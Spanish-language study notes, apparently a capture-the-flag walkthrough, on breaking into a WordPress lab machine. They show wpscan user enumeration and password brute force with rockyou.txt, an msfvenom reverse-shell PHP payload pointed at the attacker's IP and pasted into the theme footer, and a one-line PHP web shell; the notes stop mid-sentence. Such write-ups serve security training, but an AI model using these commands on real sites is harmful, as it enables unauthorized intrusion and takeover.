Entornos wordpress --> Diferentes configuraciones que puede tener para desarrollar, probar y poner en funcionamiento tu sitio web.


- Tenemos una maquina con el puerto 80 abierto, vamos a usar fuzzing utilizando la herramienta ==gobuster==

![](../Imagenes/Pasted%20image%2020250107201932.png)

- Tenemos wordpress, vamos a investigar

![](../Imagenes/Pasted%20image%2020250107202029.png)

- Vemos que lo carga incompleto.
	- Esto pasa porque hace falta que la IP de la maquina victima este apuntando al dominio de wordpress. Hay que editar el fichero /etc/hosts.
	- Pero que dominio vamos a utilizar?
![[Pasted image 20250107202212.png]]
- Se repite mucho el directorio internal.thm, vamos a ingresarlo.

![](../Imagenes/Pasted%20image%2020250107202431.png)


![](../Imagenes/Pasted%20image%2020250107202452.png)

- Ya estamos dentro de la pagina.
- Cuando estamos en wordpress, podemos poder hacer un fuzzing a la pagina para encontrar un login web.

![](../Imagenes/Pasted%20image%2020250107203016.png)

- Podemos entrar al login web.

![](../Imagenes/Pasted%20image%2020250107203106.png)

- Aquí debemos usar ==wpscan==
- WPSCAN --> Escanear y auditar la seguridad de sitios web basados en Wordpress.
- Usamos el siguiente comando:
```
wpscan --url (IP_VICTIMA_DIRECTORIO) --enumerate u,vp
```

![](../Imagenes/Pasted%20image%2020250107205024.png)

- Nos dio un usuario, por lo tanto podemos hacer fuerza bruta con ==wpscan==.
```
wpscan --url (IP_VICTIMA_DDIRECTORIO) --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```
- Ya tenemos contraseña:

![](../Imagenes/Pasted%20image%2020250107210613.png)

- Ahora nuestro objetivo es inyectar un código malicioso en .php
- En este caso no podemos subir archivos, pero si podemos editar.

![](../Imagenes/Pasted%20image%2020250107210731.png)

- Nos vamos a Appearance > Theme Editor y nos saldra un word edition.

![](../Imagenes/Pasted%20image%2020250107210845.png)

- En este word edition vamos a agregar un código malicioso.
- Pero antes, a la derecha sale un listado de files, vamos a seleccionar ==Theme Footer==

![](../Imagenes/Pasted%20image%2020250107211018.png)

- Eliminamos todo el código que ahí aparece.
	- Tenemos que poner el payload en msfvenom.
- Para este payload lo vamos a crear en msfvenom con el siguiente comando:
```
msfvenom -p php/reverse_php LHOST=(IP_MAQUINA_ATACANTE) LPORT=(PUERTO) -f raw > pwned.php
```

![](../Imagenes/Pasted%20image%2020250107211413.png)

- Hacemos un cat en el payload y eso lo ponemos en la pagina.

![](../Imagenes/Pasted%20image%2020250107211623.png)

- le damos a update file, tenemos a nuestra maquina a escucha y volvemos a la pagina IP/blog, ya tenemos conexión.

- Si solo tenemos el puerto 80 abierto, y queremos acceder a la maquina victima, si entramos al wordress, logeamos y configuramos un directorio, debemos poner el siguiente comando:

```
<?php
		system($_GET['cmd']);
?>
```
- Así cuando ejecute